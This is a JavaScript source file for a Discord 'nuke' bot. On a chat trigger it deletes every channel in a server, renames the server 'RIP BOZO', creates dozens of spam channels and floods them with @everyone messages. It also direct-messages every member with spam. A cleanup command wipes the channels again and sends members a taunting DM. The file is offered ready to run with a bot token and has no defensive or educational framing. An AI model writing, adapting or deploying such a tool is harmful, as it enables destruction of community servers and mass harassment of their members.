const { Client, Intents } = require('discord.js');
const client = new Client({ intents: [Intents.FLAGS.GUILDS, Intents.FLAGS.GUILD_MESSAGES] });

// ===== VARIABLES =====

// your id
const your_id = "940285651172081685";
// start code
const code = "start";
// stop code
const stopcode = "stop";
// cleanup code
const cleancode = "cleanup";
// if we're nuking or not
let activated = false;
// what to spam
let text = `@everyone H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H `;


// ===== DM SPAM =====
// enable DM spam?
let dmspam_enabled = true;
// what to spam in dms
let dms = "@everyone H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H H ";

// ===== SERVER STUFF =====
// how many channels to make
const howmany = 30;
// what to name nuke channels
const Cname = "get nuked";
// what to name the cleanup channel
const cleanname = "nothing happened";

// when the bot logs in
client.on('ready', () => {
  console.log(`Logged in as ${client.user.tag}!`);
});

// function to clear all server channels
let clear = (message) => {
	message.guild.channels.cache.forEach(channel => channel.delete().catch(e => console.log("tried deleting community channel"))); // fixed bug to do with community channels
}

// make a server channel
let makeChannel = (message, name) => {
	message.guild.channels.create(name, {
        type: "text",
        permissionOverwrites: [
           {
             id: message.guild.roles.everyone, 
             allow: ['VIEW_CHANNEL', 'SEND_MESSAGES', 'READ_MESSAGE_HISTORY'] //Allow permissions
		   }
        ],
    }).then(channel => {
		// a workaround to jumpstart spamming
		if (name != cleanname) {
			channel.send(text)
		} else {
			channel.send("Oops...")
		}
	})
}

// dm everyone in the server
let dmeveryone = (message, toDM) => {
	// is dm spam enabled?
	if (dmspam_enabled == true) {
		message.guild.members.cache.forEach(membersfetch => {
			membersfetch.send(toDM).catch(e => console.log(`DM error, user: ${membersfetch.user.tag}`))
		})
	}
}

client.on('messageCreate', message => {

	// switch to the message content
	switch(message.content) {

		// start nuking
		case code:
			// we start nuking 
			activated = true;
			// change server name
			message.guild.setName("RIP BOZO");
			// clear all the server channels
			clear(message)
			// make 10 server channels
			for (let i=0; i<howmany; i++) {
				makeChannel(message, Cname)
			}
			break;

		// leave the server
		case "leave":
			if (message.content == "leave") {
				if (message.author.id == your_id) {
					try {
					message.channel.send("Goodbye all");
					message.channel.guild.leave();
					console.log("left guild.");
					} catch (e) {
						console.log("ERROR: couldnt leave");
					}
				}
			}
			break;

		// stop the spam (kind of broken rn)
		case stopcode:
			activated = false;
			break;

		// clean server
		case cleancode:
			activated = false;
			clear(message)
			makeChannel(message, cleanname)
			dmeveryone(message, `Oops........ Maybe take a look at what happened to ${message.guild.name}...`)
			break;
	}

	// react to the bot's spam and reply to it with more spam
	if (activated == true) {

		// try catch for if the channel is a catergory/voice channel
		try {
			
			message.guild.channels.cache.forEach(channel => channel.send(text).catch(e => {
				console.log("Error spamming")
			}));

			// dm everyone ;)
			if (activated == true) dmeveryone(message, dms);
			
		} catch (e) {
			console.log("error")
		}
		
	}

});

// login
// put your token here
client.login(process.env['TOKEN']);
